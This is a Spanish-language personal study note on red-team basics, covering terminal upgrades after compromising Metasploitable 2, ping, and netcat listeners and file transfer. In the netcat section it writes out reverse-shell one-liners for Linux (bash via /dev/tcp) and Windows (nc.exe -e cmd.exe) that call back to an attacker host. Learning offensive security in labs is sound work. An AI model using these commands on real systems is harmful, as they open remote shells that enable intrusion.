---
title: apuntes normales
area: ciberseguridad
tipo: nota
tags: [ciberseguridad, red-team, miscelanea]
created: 2026-01-26
updated: 2026-10-12
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Sockets]]", "[[Permisos, Servicios y Logs en Linux]]", "[[redes y protocolos]]", "[[Rutas]]", "[[Ruta Python]]", "[[Ruta Mysql]]", "[[MOC-programacion]]", "[[Metasploit]]", "[[MSFvenom]]", "[[John The Ripper]]"]
---

> ⚠️ Nota miscelánea en proceso de atomización. Ya enlazada al second brain. Secciones: terminal/TTY → [[Permisos, Servicios y Logs en Linux]] · ping/scan → [[Nmap]] · netcat/sockets → [[Sockets]] · revshells → [[Metasploit]]/[[MSFvenom]] · privesc → https://gtfobins.org/ + [[John The Ripper]].
> Roadmap: https://russ0ski.github.io/MyHackingRoad/

# cambiar la apariencia de la terminal 
despues de haer hecho el ataque en una maquina linux como lo es la metasploitable 2 
podemos usar el siguiente comando para cambiar la apariencia de la terminal  :

script /dev/null -c bash 


# comando ping 

el comando ping lo usamos para enviar paquetes a la maquina o red victima de la siguiente manera :

ping <ip_de_la_maquina_victima>

o

ping  -c  4 <ip_de_la_maquina_victima>

el 4 es para enviar solo cuatro paquetes pero se puede enviar la cantidad que queramos .
esto se hace para ve si tenemos conexion con la maquina victima antes de realizar el ataque 


# netcat

Pequeña navaja suiza de sockets. Habla TCP y UDP sin drama.

## Usos típicos

- Escuchar puertos
    
- Enviar datos
    
- Crear shells reversas
    
- Transferir archivos
    

## Sintaxis básica

**Escuchar:**

`nc -nlvp 4444`

**Conectarse:**

`nc <IP> <PUERTO>`

## Shell reversa del lado víctima( linux)

bash -i >& /dev/tcp/ip_atacante/puerto/  0>&1

https://www.revshells.com/

## Shell reversa del lado víctima(windows)

./nc.exe  ip_atacante  puerto  -e cmd.exe

https://www.revshells.com/

## Transferencia de archivos

Servidor:

`nc -lvp 4444 > archivo.txt`

Cliente:

`nc <IP> 4444 < archivo.txt`

## escalar privilegios 

https://gtfobins.org/



## shell revers


https://www.revshells.com/

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Sockets]]
- [[Permisos, Servicios y Logs en Linux]]
- [[redes y protocolos]]
- [[Rutas]]
- [[Ruta Python]]
- [[Ruta Mysql]]
- [[MOC-programacion]]
- [[Nmap]]
- [[Metasploit]]
- [[MSFvenom]]
- [[John The Ripper]]
